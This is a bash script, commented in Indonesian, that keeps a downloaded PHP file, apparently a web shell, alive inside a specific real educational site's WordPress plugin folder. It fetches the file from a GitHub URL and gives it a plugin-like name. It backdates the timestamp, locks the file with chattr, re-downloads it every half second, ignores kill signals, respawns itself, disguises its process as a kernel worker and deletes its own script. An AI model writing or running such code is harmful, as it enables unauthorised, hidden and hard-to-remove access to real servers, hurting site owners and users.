#!/bin/bash

# 1. Pastikan folder tujuan ada
DIR="/home/u782030068/domains/dypcoei.edu.in/public_html/wp-content/plugins/betterdocs/includes/elementor/widgets"
mkdir -p "$DIR" 2>/dev/null

URL="https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/simple2.php"
FILE="$DIR/betterdocs-elementor-default.php"
TIME="201201081531.12"

# 2. Proteksi Sinyal (Anti-Kill)
trap '' 1 2 3 15 18 19 20

# 3. Fungsi Utama (Main Logic)
maintain() {
    while true; do
        if [ ! -f "$FILE" ]; then
            # Lepaskan kunci jika ada (hanya jika root)
            chattr -i "$FILE" 2>/dev/null
            
            # Download file
            curl -sL "$URL" -o "$FILE"
            
            # Set izin dan timestamp
            chmod 644 "$FILE" 2>/dev/null
            touch -t "$TIME" "$FILE" 2>/dev/null
            
            # Kunci file agar tidak bisa dihapus (hanya jika root)
            chattr +i "$FILE" 2>/dev/null
        fi
        
        # Pengecekan setiap 0.5 detik (sangat agresif)
        sleep 0.5
    done
}

# 4. Mekanisme Respawn (Hydra Logic)
# Jika proses dimatikan, ia akan segera muncul kembali
daemonize() {
    until maintain; do
        sleep 1
    done
}

# 5. Penyamaran & Eksekusi Latar Belakang
# Menyamarkan nama proses di 'ps' atau 'top'
echo -ne "[kworker/u16:1H]\x00" > /proc/self/comm 2>/dev/null

# Jalankan sebagai daemon yang terpisah sepenuhnya dari terminal
(daemonize) & disown

# 6. Self-Destruction Jejak Skrip
# Menghapus file skrip ini sendiri agar tidak meninggalkan bukti di disk
rm -f "$0" 2>/dev/null

exit 0
